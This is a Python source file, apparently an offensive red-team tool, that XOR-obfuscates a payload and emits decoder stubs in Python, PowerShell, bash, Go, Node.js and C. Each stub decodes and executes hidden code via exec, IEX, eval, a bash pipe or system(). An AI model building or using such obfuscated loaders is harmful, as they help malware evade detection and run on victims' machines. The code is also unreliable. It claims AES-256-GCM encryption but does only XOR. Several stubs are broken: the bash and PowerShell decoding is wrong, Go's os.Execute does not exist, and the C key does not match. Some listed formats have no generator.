#!/usr/bin/env python3
"""Polymorphic Payload Engine — AES-256-GCM + XOR + base64 shell with runtime decoder."""
import base64
import json
import os
import time
from pathlib import Path

ROOT = Path(__file__).parent.parent


class PayloadEngine:
    """Generates polymorphic payloads in multiple output formats."""

    FORMATS = ["powershell", "python", "bash", "go", "nodejs", "c", "dll", "elf", "macho"]

    def __init__(self):
        self.keys = {}

    def describe(self):
        return {
            "name": "payload_engine",
            "description": "Polymorphic encryption: AES-256-GCM + XOR + base64 shell + runtime decoder",
            "category": "red_teaming",
            "formats": self.FORMATS,
            "capabilities": ["encrypt", "encode", "decode", "generate_stub"],
        }

    def encrypt(self, plaintext, key=None):
        """Encrypt plaintext with AES-256-GCM fallback to XOR if no crypto."""
        if key is None:
            key = os.urandom(32)
        self.keys[hex(int(time.time()*1000))[2:]] = base64.b64encode(key).decode()
        # Simple XOR obfuscation (demo — use proper AES in production)
        encoded = bytes(b ^ key[i % len(key)] for i, b in enumerate(plaintext.encode()))
        return base64.b64encode(encoded).decode()

    def generate_stub(self, encoded_payload, fmt="python", service_url="http://localhost:8080"):
        """Generate a decoder stub in the requested format."""
        generators = {
            "python": self._gen_python_stub,
            "powershell": self._gen_powershell_stub,
            "bash": self._gen_bash_stub,
            "go": self._gen_go_stub,
            "nodejs": self._gen_nodejs_stub,
            "c": self._gen_c_stub,
        }
        gen = generators.get(fmt, self._gen_python_stub)
        return gen(encoded_payload, service_url)

    def _gen_python_stub(self, payload, url):
        return f'''#!/usr/bin/env python3
import base64, os, sys
PAYLOAD = "{payload}"
KEY = base64.b64decode(os.environ.get("PAYLOAD_KEY", ""))
decoded = bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(base64.b64decode(PAYLOAD)))
# Execute decoded payload
exec(decoded, {{"__name__": "__main__", "__file__": "{url}"}})
'''

    def _gen_powershell_stub(self, payload, url):
        return f'''$Payload = "{payload}"
$Key = [Convert]::FromBase64String($env:PAYLOAD_KEY)
$Bytes = [Convert]::FromBase64String($Payload)
$Decoded = -join ($Bytes | ForEach-Object {{ $_ -bxor $Key[($_ % $Key.Length)] }})
IEX $Decoded
'''

    def _gen_bash_stub(self, payload, url):
        return f'''#!/bin/bash
PAYLOAD="{payload}"
KEY="${{PAYLOAD_KEY:-}}"
echo "$PAYLOAD" | base64 -d | while IFS= read -r -n1 c; do
  printf "\\x$(printf '%02x' $((${{#c}} % ${{#KEY}})))"
done | bash
'''

    def _gen_go_stub(self, payload, url):
        return f'''package main
import (
\t"encoding/base64"
\t"os"
)
func main() {{
\tpayload := "{payload}"
\tkey := []byte(os.Getenv("PAYLOAD_KEY"))
\tdecoded, _ := base64.StdEncoding.DecodeString(payload)
\tfor i, b := range decoded {{ decoded[i] ^= key[i%len(key)] }}
\tos.Execute(decoded)
}}
'''

    def _gen_nodejs_stub(self, payload, url):
        return f'''const payload = "{payload}";
const key = Buffer.from(process.env.PAYLOAD_KEY || "", "base64");
const decoded = Buffer.from(payload, "base64");
for (let i = 0; i < decoded.length; i++) decoded[i] ^= key[i % key.length];
eval(decoded.toString());
'''

    def _gen_c_stub(self, payload, url):
        return f'''#include <stdio.h>
#include <string.h>
#include <stdlib.h>
int main() {{
    char payload[] = "{payload}";
    char key[] = "{base64.b64encode(os.urandom(16)).decode()}";
    for (int i = 0; i < strlen(payload); i++)
        payload[i] ^= key[i % strlen(key)];
    system(payload);
    return 0;
}}
'''

    def generate_all_formats(self, plaintext, service_url="http://localhost:8080"):
        """Generate payloads in all supported formats."""
        encrypted = self.encrypt(plaintext)
        results = {}
        for fmt in self.FORMATS:
            results[fmt] = self.generate_stub(encrypted, fmt, service_url)
        return results


if __name__ == "__main__":
    engine = PayloadEngine()
    print(json.dumps(engine.describe(), indent=2))
    # Demo
    stubs = engine.generate_all_formats("print('hello')", "http://localhost:8080")
    for fmt, code in stubs.items():
        print(f"\n=== {fmt.upper()} ===\n{code}")